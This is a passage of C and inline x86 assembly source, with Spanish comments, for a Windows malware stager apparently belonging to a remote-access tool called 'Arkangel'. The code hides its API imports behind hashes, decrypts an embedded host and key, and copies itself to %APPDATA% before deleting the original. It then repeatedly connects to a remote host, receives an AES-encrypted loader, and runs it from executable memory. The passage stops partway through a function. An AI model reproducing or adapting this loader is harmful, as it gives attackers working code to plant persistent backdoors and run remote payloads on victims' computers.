/*###############################################################################
** Compilaci�n condicionada:
**    Dependiendo de las opciones aqu� seleccionadas el c�digo 
**    resultante tendr� unas caracter�sticas u otras.
**    Para m�s informaci�n sobre �stas revisar 'macros.h'.
**    ���EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACI�N CONDICIONADA!!!
*###############################################################################*/

//No queremos que muestre el warning de etiqueta sin referencia, 
//ya que las usamos para mejorar la legibilidad del c�digo
#pragma warning(disable:4102)
//No queremos el warning de EMMS, sabemos que estamos haciendo.
#pragma warning(disable: 4799)

#include <Windows.h>
#include "macros.h"

void LoadFunctions(DWORD numHashes);

void __declspec(naked) main(){
    __asm{
        /*###############################################################################
        ** Obtenci�n del Delta offset:
        **    Obtenemos la posici�n relativa de nuestro c�digo.
        **    Utilizamos un c�digo poco com�n que utiliza la FPU.
        **    Primero utilizamos 'fldXX' para actualizar el entorno de FPU
        **    rellenando el item 'FPUInstructionPointer' de la estructura
        **    con la direcci�n de la �ltima instrucci�n FPU
        **    Por �ltimo cargamos la estructura de entorno con ('fstenv') 
        **    de tal forma que el item que necesitamos quede en esp y lo sacamos a edi.
        **    NOTAS{
        **        1: Se harcodean los opcodes para evitar tanto la comprobaci�n
        **        de errores de FP como para evitar el byte superfluo que a�ade
        **        el visualC
        **    }
        *###############################################################################*/
find_delta:
        /* Hay que cargar una constante que no genere ceros en la configuraci�n
        D9EB           FLDPI        MM7-> B172 17F7 D1CF 79AC
        D9E9           FLDL2T       MM7-> 9A20 9A84 FBCF F799
        D9EA           FLDL2E       MM7-> B8AA 3B29 5C17 F0BC
        D9EC           FLDLG2       MM7-> D49A 784B CD1B 8AFE
        D9ED           FLDLN2       MM7-> C90F DAA2 2168 C235
        */
        fldln2
#ifdef SC_DELTA
        EMIT_BYTE_ARRAY(
            (0xD9) (0x74) (0x24) (0xF4)    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
        )
        pop  edi
        #ifdef SC_NULL
        add  edi, K
        sub  edi, (find_delta+K)
        #else //SC_NULL
        sub  edi, find_delta
        #endif //SC_NULL
#endif //SC_DELTA

        //Saltamos los hashes y funciones.
        jmp  over_fncnhashes
    }
#pragma region constantes
        /*###############################################################################
        ** Constantes:
        **    Aqu� se declaran las constantes utilizadas en el c�digo{
        **        HASHES    : Hashes de las APIs de las que se obtendr� la direcci�n.
        **        VARS      : Variables utilizadas.
        **        KEY       : Utilizado para identificar al cliente en el 'handshake'.
        **        HOST      : D�nde se conectar� el socket.
        **    }
        *###############################################################################*/
#pragma region hashes
kernel32_symbol_hashes:
        #define kernel32_count  12
        API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
        API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s'))
        API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p'))
        API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
        API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
        API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A'))
        API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A'))
        API_DEFINE(CopyFileA, ('C') ('o') ('p') ('y') ('F') ('i') ('l') ('e') ('A'))
        API_DEFINE(DeleteFileW, ('D') ('e') ('l') ('e') ('t') ('e') ('F') ('i') ('l') ('e') ('W'))
        API_DEFINE(WinExec, ('W') ('i') ('n') ('E') ('x') ('e') ('c'))
        API_DEFINE(CreateFileA, ('C') ('r') ('e') ('a') ('t') ('e') ('F') ('i') ('l') ('e') ('A'))
        API_DEFINE(ReadFile, ('R') ('e') ('a') ('d') ('F') ('i') ('l') ('e'))

ws2_32_symbol_hashes:
        #define ws2_32_count    7
        API_DEFINE(WSASocketA, ('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A'))
        API_DEFINE(connect, ('c') ('o') ('n') ('n') ('e') ('c') ('t'))
        API_DEFINE(WSAStartup, ('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p'))
        API_DEFINE(closesocket, ('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t'))
        API_DEFINE(inet_addr, ('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r'))
        API_DEFINE(gethostbyname, ('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e'))
        API_DEFINE(recv, ('r') ('e') ('c') ('v'))

advapi32_symbol_hashes:
        #define advapi32_count	4
        API_DEFINE(CryptAcquireContextA, ('C') ('r') ('y') ('p') ('t') ('A') ('c') ('q') ('u') ('i') ('r') ('e') ('C') ('o') ('n') ('t') ('e') ('x') ('t') ('A'))
        API_DEFINE(CryptSetKeyParam, ('C') ('r') ('y') ('p') ('t') ('S') ('e') ('t') ('K') ('e') ('y') ('P') ('a') ('r') ('a') ('m'))
        API_DEFINE(CryptImportKey, ('C') ('r') ('y') ('p') ('t') ('I') ('m') ('p') ('o') ('r') ('t') ('K') ('e') ('y'))
        API_DEFINE(CryptDecrypt, ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t'))
#pragma endregion

#pragma region VARS
        VAR_DEFINE(CommandLine)
        VAR_DEFINE(APPDATA)
        VAR_DEFINE(DAT_NFO)
        VAR_DEFINE(pHOST)
        VAR_DEFINE(pKEY)
        VAR_DEFINE(pMUTEX)
        VAR_DEFINE(hProv)
        VAR_DEFINE(hKey)
        VAR_DEFINE(hSocket)
        VAR_DEFINE(pBuff)
        VAR_DEFINE(buffLen)
#pragma endregion
        CALC_STACKSIZE()
//����CONSTANTES TEMPORALES!!!!
    __asm{
        /*###############################################################################
        ** Subrutina que copia de ESI a EDI pasando 
        ** de UNICODE a ASCII hasta encontrar el caracter que haya en DL
        *###############################################################################*/
copy_uni_to_ascii_filter:
copy_next:
        lodsb                           //Cargamos byte
        cmp  al, dl                     //�Es el caracter que buscamos?
        jz copy_done                    //Si lo es hemos acabado...
        stosb                           //Guardamos el byte
        inc esi                         //Saltamos el nulo
        jmp copy_next                   //Siguiente car�cter
copy_done:
        ret

#ifdef ERR_CHECK
        /*###############################################################################
        ** gtfo:
        **    M�todo para salir en cualquier momento de la ejecuci�n sin mostrar ning�n
        **    error cr�tico, adem�s es usado para tener una mejor idea de lo ocurrido
        *###############################################################################*/
gtfo:
        pop  edx
        test eax, eax
        jne  conti
        call [ebp+_ExitProcess]
conti:
        add  esp, 0x4
        push edx
        ret
#endif //ERR_CHECK

CreateBuff:
        cdq                             //EDX = 0
        push PAGE_EXECUTE_READWRITE     //v
        pushc(MEM_COMMIT)               //v
        push eax                        //v
        push edx                        //v
        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
#ifdef ERR_CHECK
        push ERR_MEM                    //v
        call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
#endif //ERR_CHECK
        ret
over_fncnhashes:
        //Saltamos sobre la configuraci�n
        jmp  to_start
    }
config_start:
KEY:   	//typedef struct aes128Blob{
            //BLOBHEADER{
                /*bType*/       //EMIT_BYTE(PLAINTEXTKEYBLOB)
                /*bVersion*/    //EMIT_BYTE(CUR_BLOB_VERSION)
                /*wReserved*/   //EMIT_WORD(0)
                /*aiKeyAlg*/    //EMIT_DWORD(CALG_AES_128)
            //}
            /*keySize*/         //EMIT_DWORD(0x10)
            /*keydata[16]*/     //EMIT_BYTE_ARRAY((0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))	
            //SHA1("karcrack:1234")
        //}
MUTEX:  //EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
HOST:   //EMIT_BYTE_ARRAY(('1') ('9') ('2') ('.') ('1') ('6') ('8') ('.') ('0') ('.') ('6') ('6')(0))
        EMIT_BYTE_ARRAY((0x9C) (0x57) (0xFF) (0xFF) (0xC6) (0x17) (0x72) (0xB1) (0xC0) (0x0D) (0xA7) (0xD1) (0xC6) (0x25) (0x45) (0x9F) (0xF5) (0x95) (0xF7) (0xD5) (0xA4) (0x63) (0x17) (0xD0) (0x77) (0xAF) (0xFC) (0xE0) (0x04) (0x97) (0xAB) (0xC4) (0xBC) (0x79) (0xCF) (0xD1) (0x94) (0x1F) (0x29) (0xD7) (0xA4) (0x7B) (0xCF) (0xD1) (0xF9) (0x71) (0x72) (0xB1))

#define CONFIG_SIZE 52
#define PACKET_CONFIG_COUNT CONFIG_SIZE/8
config_end:
#pragma endregion
    __asm{
to_start:
        /*###############################################################################
        ** Creaci�n del stack de direcciones:
        **    Lo primero que hacemos es reservar espacio en el stack para almacenar
        **    las direcciones de APIs, tambi�n las variables.
        **    Utilizaremos durante todo el c�digo EBP como puntero al inicio de este
        **    'stack de direcciones'
        *###############################################################################*/
        pushc(STACKSIZE)
        pop  eax
        sub  esp, eax 
        lea  ebp, [esp+0x40]
#ifdef SC_DELTA
        push edi                        //Guardamos el Delta
#endif //SC_DELTA
        /*###############################################################################
        ** Carga de APIs:
        **    Iniciamos el proceso de carga de APIs.
        **    Primero se obtendr� el puntero a kernel32 despu�s se cargar�n sus funciones,
        **    entre ellas LoadLibraryA(), con �sta se cargar�n el resto de librerias.
        *###############################################################################*/
        
        //Obtenemos en eax la direcci�n de kernel32
        push 0x30                       //v
        pop  esi                        //v
        lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
        push [eax+0x0C]                 //Guardamos en el stack PEB->Ldr
        mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
        /*###############################################################################
        ** Obtenci�n de %APPDATA%:
        ** Aprovechamos que hemos sacado el PEB para obtener kernel32 y
        ** recorremos el bloque de environments en busca de \0APPDATA=*
        *###############################################################################*/
        mov  edi, [eax+0x44]            //v
        inc  edi                        //v
        inc  edi                        //>Saltamos el '"'
        mov  [ebp+_CommandLine], edi    //>Almacenamos el puntero a CommandLine
        mov  esi, [eax+0x48]            //ESI = Environment

hash_start:
        xor  ebx, ebx                   //EBX = 0 = hash
redo:   lodsw                           //AX = Environment[i]; i++
        test al, al                     //(AL == 0)?
        jz   hash_start                 //Si el caracter es nulo volvemos a empezar...
next:   xor  bl, al                     //hash ^= Environment[i]
        cmp  al, '='                    //(AL == '=')?
        jne  redo                       //Si no se trata de un igual cargamos el siguiente caracter
        cmp  bl, 0x6C                   //Si es un igual comprobamos si el hash equivale al de "APPDATA"
        jne  redo                       //En caso negativo seguimos buscando.
appdata_found:

        //ESI = &APPDATA
        mov  [ebp+_APPDATA], esi        //Almacenamos el puntero a APPDATA (UNICODE)

        pop  esi                        //ESI = PEB->Ldr
        mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
next_module:
        mov  eax, [esi+0x20]            //EAX = PEB->Ldr.InInitOrder[X].module_name (UNICODE)
        cmp  [eax+0xC], '3'             //module_name[6] == '3'?
        mov  eax, [esi+0x08]            //EAX = PEB->Ldr.InInitOrder[X].base_address
        mov  esi, [esi]                 //ESI = PEB->Ldr.InInitOrder[X].flink (NextModule)
        jne  next_module
find_kernel32_finished:
#ifdef SC_DELTA
        pop  edi                        //Restauramos EDI
        push edi                        //Y guardamos otra vez
#endif //SC_DELTA
        movr(esi, kernel32_symbol_hashes)// Puntero al primer hash
        movr(edi, LoadFunctions)        // Puntero a LoadFunctions()

        sub  ebp, 0x40                  //Apuntamos al inicio de Stack
        //Cargamos las APIs de kernel32 en la pila a partir de los hashes
        push kernel32_count             //v N�mero de hashes de kernel32
        call edi                        //>LoadFunctions(kernel32_count);
        mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA+0x40]//EBX = &LoadLibraryA

        //Obtenemos la BaseAddress de ws2_32
        pushc('23')                     //v
        pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
        push esp                        //v
        call ebx                        //>LoadLibraryA("ws2_32");
        pop  edx                        //v
        pop  edx                        //>Restauramos la pila sacando la cadena ANSI

        //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
        push ws2_32_count               //v N�mero de hashes de ws2_32
        call edi                        //>LoadFunctions(ws2_32_count);

        //Obtenemos el BaseAddress de advapi32
        cdq                             //EDX = 0
        push edx                        //v
        pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
        pushc('avda')                   //v
        push esp                        //v
        call ebx                        //>LoadLibraryA("advapi32");
        add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI

        push advapi32_count             //v N�mero de hashes de advapi32
        call edi                        //>LoadFunctions(advapi32_count);

        add  esp, 0xC                   //Reparamos el stack despu�s de las llamadas a LoadFunctions()
#ifdef SC_DELTA
        pop  edi                        //Recuperamos el Delta
#endif //SC_DELTA
        //Volvemos a apuntar al inicio del stack de APIs
        sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4 - 0x40

        //Creamos un buffer para almacenar la configuraci�n cifrada y luego descifrarla.
        movr(esi, config_start)         //Cargamos la posici�n del inicio de la config

        /*###############################################################################
        **        TRAS ESTE PUNTO YA NO NECESITAMOS ALMACENAR EL DELTA (EDI)
        *###############################################################################*/

        /*###############################################################################
        ** Descifrado y almacenado de la configuraci�n:
        **   - Se descifra la configuraci�n usando un packet XOR
        *###############################################################################*/
        push CONFIG_SIZE                //v
        pop  eax                        //>EAX = CONFIG_SIZE
        call CreateBuff                 //>CreateBuff(CONFIG_SIZE);

        mov  edx, eax                   //EDX = &Buffer

#pragma region DECRYPT_CONFIG
        push PACKET_CONFIG_COUNT        //v
        pop  ecx                        //>ECX = i = Cantidad de bloques de 8 en config
xornext:
        lea  ebx, [esi+(ecx*8)-8]       //EBX = &(QWORD)config_start[i]
        movq mm0, QWORD PTR[ebx]        //MM0 = (QWORD)*EBX
        pxor mm0, mm7                   //MM0^= MM7
        movq QWORD PTR[edx], mm0        //*(QWORD)Buffer = MM0
        add  edx, 8                     //Buffer+=8
        loop xornext                    //i-=1
#pragma endregion

        //Guardamos los punteros a los valores descifrados
        mov  [ebp+_pKEY], eax
        lea  ebx, [eax+0x1C]
        mov  [ebp+_pMUTEX], ebx
        add  ebx, 0x8
        mov  [ebp+_pHOST], ebx

        /*###############################################################################
        **                          Comprobaci�n del Mutex
        *###############################################################################*/
        cdq                             //EDX = 0
        push [ebp+_pMUTEX]              //v
        push edx                        //v
        push edx                        //v
        call [ebp+_CreateMutexA]        //>CreateMutexA(NULL, False, &MUTEX)
        push 0x18                       //v
        pop  esi                        //v
        lods DWORD PTR FS:[esi]         //>EAX = &(TEB)
        mov  eax, [eax+0x34]            //>GetLastError()
#ifdef ERR_CHECK
        xor  al, 0xB7
        push ERR_MTX
        call gtfo
#else //ERR_CHECK
        test eax, eax
        jz  nomtx
        push ERR_MTX
        call [ebp+_ExitProcess]
nomtx:
#endif //ERR_CHECK
        /*###############################################################################
        ** Realizamos el Melt:
        **   - Primero nos copiamos a %APPDATA%\XXXX.exe
        **   - Despu�s ejecutamos la copia pas�ndole de par�metro nuestra ruta.
        **
        **   - La copia se encarga de eliminarnos.
        *###############################################################################*/
        /*###############################################################################
        **      EN CASO DE NO HABER MELT NECESITAMOS IGUALMENTE OBTENER 
        **                LA RUTA A LOS DATOS OFFLINE
        *###############################################################################*/
#ifdef MELT
        mov  edi, [ebp+_CommandLine]    //EDI = &CommandLine
        push edi                        //Guardamos &CommandLine para luego
        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
        //Comprobamos si estamos en %APPDATA%
next_char:
        cmpsw                           //Comprobamos el caracter y pasamos al siguiente
        je   next_char                  //Si coincide probamos con el siguiente
        cmp  [esi-2], bh                //Si no coincide miramos si es el ultimo char de APPDATA
        je   do_not_copy                //Si es el \0 la ruta coincide y por lo tanto no nos copiamos

        pushc(256)                      //v
        pop  eax                        //>EAX = 512
        call CreateBuff                 //Creamos Buffer para las rutas

        mov  edi, eax                   //EDI = EAX
        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
        mov  [ebp+_APPDATA], edi        //Guardamos en _APPDATA la nuestra nueva ruta

        //Copiamos %APPDATA% en el buffer
        mov  al, '"'                    //v
        stosb                           //>Metemos la comilla de apertura
        cdq                             //v EDX = 0
        call copy_uni_to_ascii_filter   //>Y pasamos de UNICODE a ASCII hasta encontrar un \0

        //Por ahora &_APPDATA = >>"%APPDATA%<<
        //A�adimos a %APPDATA% un nombre al azar.
        cdq                             //EDX = 0
        push edi                        //v
        push edx                        //v
        push edx                        //v
        push edi                        //v
        call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
        mov  DWORD PTR[edi+5], 'exe.'   //Reemplazamos la extensi�n a ".exe"
        
        //Ahora &_APPDATA = >>"%APPDATA%\XXXX.exe\0<<
        pop  esi                        //Recuperamos el puntero a &CommandLine
        lea  edi, [edi+11]              //Saltamos el \0\0 que luego ser� comilla de cierre y espacio
        push edi                        //Guardamos el puntero para luego

        mov  dl, '"'                    //v
        call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar una comilla

        //&_APPDATA = >>"%APPDATA%\XXXX.exe\0\0%MyPath%<<
        pop  edi                        //Recuperamos el puntero a nuestra ruta
        cdq                             //EDX = 0
        push edx                        //v
        push [ebp+_APPDATA]             //v
        inc  DWORD PTR[esp]             //(Saltamos la comilla)
        push edi                        //v
        call [ebp+_CopyFileA]           //>CopyFileA(&MyPath, &APPDATA, false);

        dec  edi                        //v
        dec  edi                        //>Volvemos a \0\0 que se transformar� a >>" <<
        mov  ax, ' "'                   //v
        stosw                           //>Metemos las comillas y el espacio

        //&_APPDATA = >>"%APPDATA%\XXXX.exe" %MyPath%<<
        //Ejecutamos nuestra copia pas�ndole nuestra ruta
        push 1                          //V
        push [ebp+_APPDATA]             //v
        call [ebp+_WinExec]             //>WinExec(&_APPDATA, SW_SHOWNORMAL);

        push MELT_DONE                  //v
        call [ebp+_ExitProcess]         //>ExitProcess(MELT_DONE);

do_not_copy://(Somos la copia)
        //Vamos a finalizar el Melt eliminando el fichero que se nos pasa
        pop  esi                        //Recuperamos el inicio &CommandLine (=LIMPIAR STACK)
        //EDI = Puntero a nuestro nombre de ejecutable
        mov  cl, 0x7F                   //TAMA�O M�XIMO PARA NUESTRO NOMBRE + EXT
        xor  eax, eax                   //v
        mov  al, '"'                    //> EAX = '"'
        repne scasw                     //>Buscamos en EDI la comilla
        inc  edi                        //v
        inc  edi                        //>Saltamos el espacio
        //EDI = Puntero al fichero a eliminar
        push edi                        //v
        call [ebp+_DeleteFileW]         //>DeleteFileW(&file_to_delete);
#endif //MELT
        mov  esi, [ebp+_CommandLine]
        pushc(256)
        pop  eax
        call CreateBuff
        mov  edi, eax
        mov  [ebp+_DAT_NFO], edi       //Almacenamos la ruta del .dat que contiene las cosas offline
        mov  dl, '"'                    //v
        call copy_uni_to_ascii_filter   //> Pasamos de UNICODE a ASCII hasta encontrar una comilla
        //EDI apunta ahora al final de nuestra ruta.
        mov  DWORD PTR[edi-4], 'tad.'   //Cambiamos la ruta

        cdq                             //EDX = 0
        push edx                        //v
        push edx                        //v
        push OPEN_EXISTING              //v
        push edx                        //v
        push edx                        //v
        pushc(GENERIC_READ)             //v
        push [ebp+_DAT_NFO]             //v
        call [ebp+_CreateFileA]         //>CreateFileA(&DAT_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        mov  [ebp+_DAT_NFO], eax        //Guardamos el handle al fichero

#define BUFF_SIZE 0x5000
_cont:  xor  eax, eax                   //EAX = 0
        mov  ah, 0x50                   //EAX = BUFF_SIZE
        call CreateBuff                 //CreateBuff(BUFF_SIZE)
        mov  [ebp+_pBuff], eax          //pBuffer = EAX

        /*###############################################################################
        ** Creaci�n del socket:
        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librer�as
        **    creamos el socket para conectarnos al cliente e iniciar la autentificaci�n.
        **    Otra vez m�s utilizamos el stack para evitar crear buffers innecesarios.
        *###############################################################################*/

        //Iniciamos el socket
        xor  ebx, ebx                   //EBX = 0
        mov  bl, 0x19                   //EBX = 0x19
        shl  ebx, 0x4                   //EBX = 0x190
        sub  esp, ebx                   //Reservamos espacio suficiente en la pila para WSADATA
        push esp                        //v
#ifdef SC_NULL
        push 2                          //v
        add  [esp+1], 2                 //v VersionRequested = 2.2
#else //SC_NULL
        push 0x202                      //v VersionRequested = 2.2
#endif //SC_NULL
        call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
        add  esp, ebx                   //Restauramos la pila eliminando WSADATA de �sta

newSocket:
        //Creamos el socket AF_INET y SOCK_STREAM
        xor  edx, edx                   //EDX = 0
        push edx                        //v
        push edx                        //v
        push edx                        //v
        push edx                        //v
        inc  edx                        //v EDX = 1 (SOCK_STREAM)
        push edx                        //v
        inc  edx                        //v EDX = 2 (AF_INET)
        push edx                        //v
        call [ebp+_WSASocketA]          //>WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
        mov  [ebp+_hSocket], eax        //hSocket = EAX

        jmp  connect_loop
sleep_and_loop:
        cmp  DWORD PTR[ebp+_DAT_NFO], -1
        je   do_the_loop
        cdq                             //EDX = 0
        push edx                        //v
        push edx                        //v
        push esp                        //v
        xor  eax, eax                   //EAX = 0
        mov  ah, 0x50                   //EAX = BUFF_SIZE
        push eax                        //v
        push [ebp+_pBuff]               //v
        push [ebp+_DAT_NFO]             //v
        call [ebp+_ReadFile]            //>ReadFile(hFile, &pBuff, 5000, &read, NULL)
        pop  edx
do_the_loop:
#ifdef SC_NULL
        push 0x7F                       //v
        shl  DWORD PTR[esp], 0x3        //v
#else //SC_NULL
        push 0x3F8                      //v
#endif //SC_NULL
        call [ebp+_Sleep]               //Sleep(0x3F8);
connect_loop:
        //Obtenemos la direcci�n v�lida
        push [ebp+_pHOST]               //v
        call [ebp+_gethostbyname]       //>gethostbyname(&HOST);
        
        test eax, eax                   //v
        jz  sleep_and_loop              //> Si ha habido alg�n error obteniendo el HOST repetimos

        add  eax, 0x20                  //EAX = hostent.h_name
        push eax                        //v
        call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);

#define PORT 0x932B0002
        //Construimos la sockaddr_in en la pila
        push eax                        //push IP
        pushc(PORT)                     //push PORT            (TO DO:<<<< EL BUILDER PARCHEAR� ESTO!!!! :D)
        mov  ebx, esp                   //EBX = &sockaddr_in

        push 0x10                       //v size(sockaddr_in)
        push ebx                        //v
        push [ebp+_hSocket]             //v
        call [ebp+_connect]             //>connect(hSocket, &sockaddr_in, size(sockaddr_in));
        pop  ebx                        //v
        pop  ebx                        //>Reparamos la pila eliminando sockaddr_in
        test eax, eax                   //v
        jl   sleep_and_loop             //>(EAX<0)? (Error, reseteemos)
connected:
        /*###############################################################################
        ** Recepci�n de datos desde el cliente:
        **  Una vez establecida la conexi�n con �xito intentamos recibir 
        **  el paquete inicial compuesto de:
        **      IV+checksum+LOADER_IAT+CARGADOR
        **  Siendo cada uno:
        **      *IV(16bytes)    : Vector de inicializaci�n para el cifrado
        **{{
        **      *checksum       : checksum de todo el payload, para evitar error cr�tico al ejecutar.
        **      *LOADER     : Loader de Arkangel encargado de descargar, ubicar y ejecutar el cargador de plugins.
        **}}
        **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(pass)
        *###############################################################################*/
recibir:
        cdq                             //EDX = 0
        push edx                        //v
        pushc(BUFF_SIZE)                //v
        push [ebp+_pBuff]               //v
        push [ebp+_hSocket]             //v
        call [ebp+_recv]                //>recv(hSocket, pBuff, BUFF_SIZE, MSG_WAITALL);
        mov  [ebp+_buffLen], eax        //buffLen = EAX
        cmp  eax, 0x7F                  //> Suficientes Bytes para no generar problemas
        jg   init_decrypt               //>EAX>7F? (Todo correcto? Procedemos a descifrar)
KillSocket:
        push [ebp+_hSocket]             //v
        call [ebp+_closesocket]         //>closesocket(hSocket);
        jmp  newSocket                  //Creamos un nuevo socket

        /*###############################################################################
        ** Descifrado y autentificaci�n:
        **    Una vez obtenidos los datos comprobamos que el emisor ha sido el cliente.
        **    Para esto los desciframos con la clave compartida que tenemos (SHA1(user+pass))
        **    Luego, para evitar ejecutar c�digo err�neo comprobamos el checksum
        *###############################################################################*/

init_decrypt:
        //Adquirimos el handle para trabajar con el CSP deseado.
        cdq                             //EDX = 0
#ifdef SC_NULL
        push 0x0F                       //v
        shl  DWORD PTR[esp], 0x1C       //v
#else //SC_NULL
        push CRYPT_VERIFYCONTEXT        //v
#endif //SC_NULL
        push PROV_RSA_AES               //v
        push edx                        //v
        push edx                        //v
        push ebp                        //v
        add  [esp], _hProv              //v
        call [ebp+_CryptAcquireContextA]//>CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

        //Importamos la clave
        cdq                             //EDX = 0
        push ebp                        //v
        add  [esp], _hKey               //v Direcci�n a la variable que contendr� el Handler a la key
        push edx                        //v
        push edx                        //v
        push 0x1C                       //v sizeof(aes128Blob)
        push [ebp+_pKEY]                //v Estructura que contiene la clave exportada
        push [ebp+_hProv]               //v
        call [ebp+_CryptImportKey]      //>CryptImportKey(hCryptProv, (BYTE*)&blob, sizeof(aes128Blob), 0, 0, &hKey);

        //Establecemos el valor del IV(Initialization Vector)
        cdq                             //EDX = 0
        push edx                        //v
        push [ebp+_pBuff]               //v
        push KP_IV                      //v
        push [ebp+_hKey]                //v
        call [ebp+_CryptSetKeyParam]    //>CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);

        //Restamos el IV a los datos
        sub  DWORD PTR[ebp+_buffLen], 16//buffLen-= 16
        push [ebp+_buffLen]             //Guardamos SizeOfPayLoad+4

        //Finalmente desciframos los datos obtenidos
        //Los datos se encuentran en el paquete as�: IV(16Bytes)+DataEncrypt

        cdq                             //EDX = 0

        mov  esi, [ebp+_pBuff]          //ESI = pBuff = &IV
        add  esi, 16                    //ESI = &Checksum
        push [ebp+_buffLen]             //Variable temporal para guardar el tama�o de los datos a leer

        push esp                        //v
        push esi                        //v
        push edx                        //v
        push 1                          //v
        push edx                        //v
        push [ebp+_hKey]                //v
        call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, True, 0, pBuff, &buffLen);

        pop  edx                        //Descartamos la variable temporal
        pop  ecx                        //Recuperamos SizeOfPayload+4
        test eax, eax                   //v
        jz   KillSocket                 //(EAX==0)? Si EAX es cero es que no se ha descifrado correctamente.
                                        // Posiblemente la cantidad recibida no sea multiple de 16
        /*###############################################################################
        ** Comprobaci�n del checksum:
        **    El checksum esta en +16 de los datos recibidos.
        **    El algoritmo utilizado para calcular el checksum es:
        **        *FNV1a (http://goo.gl/1A7ir)
        **    (Elegido por una buena relaci�n tama�o-calidad)
        *###############################################################################*/

        sub  ecx, 4                     //ECX = SizePayload
        mov  ebx, [esi]                 //EBX = CheckSum
        add  esi, 4                     //ESI+= 4 (saltamos checksum)
        cdq                             //hash = 0
FNV1a:
        lodsb                           //al = str[i]; i++;
        xor  dl, al                     //>hash ^= str[i];
        imul edx, 0x1EF30EB             //>hash *= 0x1EF30EB;
        loop FNV1a                      //>(len--);(len < 0)?

        cmp  edx, ebx
        jne  KillSocket                 //>(EDX==checksum?)

        push [ebp+_hKey]                //v
        push [ebp+_hSocket]             //v
        push [ebp+_GetProcAddress]      //v
        push [ebp+_LoadLibraryA]        //v
        mov  eax, [ebp+_pBuff]          //v
        add  eax, 0x14                  // Saltamos hasta el loader
        call eax                        //>loader(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);

        //En caso de que haya habido alg�n error no cr�tico el loader me devuelve la ejecuci�n
        jmp KillSocket                  //Reiniciamos el bucle de espera
    }
}

/*###############################################################################
** LoadFunctions:
**  M�todo encargado de rellenar el stack de direcciones.
**  Llama a la funci�n FindFunction() por cada hash en la lista
**  almacenando la direcci�n en su respectiva posici�n del stack.
**  RECIBE BASEADDRESS EN EAX y el puntero a HASHES en ESI
*###############################################################################*/
void __declspec(naked) LoadFunctions(DWORD numHashes){
    __asm{
        push edi
        push ecx
        mov  ecx, [esp+0xC]             //ECX = numHashes
        //ESI = &lpHashes
        mov  edx, eax                   //EDX = &IMAGE_DOS_HEADER
        mov  edi, ebp

nextFunction:
        lodsw                           //mov ax, WORD[esi]; esi+=2
#pragma region FindFunction
/*###############################################################################
** FindFunction:
**    Funci�n que recorre la EAT de una DLL en busca de cierta funci�n.
**    Para ello genera un hash del nombre de la funci�n y lo compara con el recibido.
**    Para m�s informaci�n revisar 'macros.h'
*###############################################################################*/
find_function:
        pushad
        //EDX = &IMAGE_DOS_HEADER
        mov  edi, [edx+0x3C]            //EDI = IMAGE_DOS_HEADER.e_lfanew
        mov  edi, [edx+edi+0x78]        //EDI = IMAGE_OPTIONAL_HEADER->DataDirectory(IMAGE_FILE_EXPORT_DIRECTORY).VirtualAddress
        add  edi, edx                   //EDI = EAT (RVA)
        mov  ecx, [edi+0x18]            //ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
        mov  ebp, [edi+0x20]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
#ifdef SC_NULL
        inc  edx                        //EDX++;
#endif //SC_NULL
        add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
